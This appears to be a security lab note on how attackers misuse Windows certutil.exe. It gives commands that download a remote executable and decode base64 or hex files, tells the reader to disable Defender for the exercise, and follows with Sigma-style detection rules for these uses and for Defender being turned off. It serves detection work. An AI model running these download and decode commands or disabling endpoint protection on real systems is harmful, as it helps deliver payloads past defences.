
### Abusing certutil.exe
Let's try how certutil.exe can be missused by the attackers. 
ref: https://lolbas-project.github.io/lolbas/Binaries/Certutil/

Note: For this Excercies we need to disable the microsoft defender for endpoint. Otherwise all the commandline will be blocked. 

1) Download the a file
    `certutil.exe -urlcache -f https://www.example.org/file.exe file.exe`

    `certutil.exe -verifyctl -f https://www.example.org/file.exe file.exe`

    `certutil.exe -URL https://www.example.org/file.exe`

    If path is not specified it will be stored in the %LOCALAPPDATA%low\Microsoft\CryptnetUrlCache\Content\[hash]

2) Encode and Decode the data

    `certutil -encode file.ext file.base64`

    `certutil -decode file.base64 file.ext`

    `certutil -decodehex file.hex file.ext`

#### Detection Logics: 

Detect Execution of certutil and it's writing the files to the disk. (usually the certs are downloaded, but any other files need to be flagged)
```
    detection:
        condition: Selection_1 and Selection_2
        Selection_1:
            ProviderName|all:
            - Microsoft-Windows-Sysmon
            EventID|all:
            - '1'
            Image|endswith:
            - certutil.exe
            - certutil
        Selection_2:
            CommandLine|contains:
            - 'urlverify '
            - 'urlcache '
```

certutil file is used to encode and decode files/data

```
    detection:
        condition: Selection_1 and Selection_3
        Selection_1:
            ProviderName|all:
            - Microsoft-Windows-Sysmon
            EventID|all:
            - '1'
            Image|endswith:
            - certutil.exe
            - certutil
        Selection_3:
            CommandLine|contains:
            - 'decode '
            - 'decodehex '
```
```
        detection:
        condition: Selection_1 and Selection_3
        Selection_1:
            ProviderName|all:
            - Microsoft-Windows-Sysmon
            EventID|all:
            - '1'
            Image|endswith:
            - certutil.exe
            - certutil
        Selection_3:
            CommandLine|contains:
            - 'encode '
```

Certutil making internet connections, (usually it makes connections to download other chained certs, crls etc.)
    TODO:_

### Additional Rules: Defender Disabled

```
    detection:
        condition: Selection_1 and ( Selection_2 or Selection_3 or Selection_4 )
        Selection_1:
            ProviderName|all:
            - Microsoft-Windows-Sysmon
            EventID|all:
            - '13'
            - '12'
        Selection_2:
            EventData|contains:
            - SECURITY_PRODUCT_STATE_SNOOZED
        Selection_3:
            RuleName|contains:
            - 'T1089,Tamper-Defender'
        Selection_4:
            TargetObject|all:
            - >-
                HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time
                Protection\DisableRealtimeMonitoring
            EventType|all:
            - SetValue
            Details|all:
            - DWORD (0x00000001)
```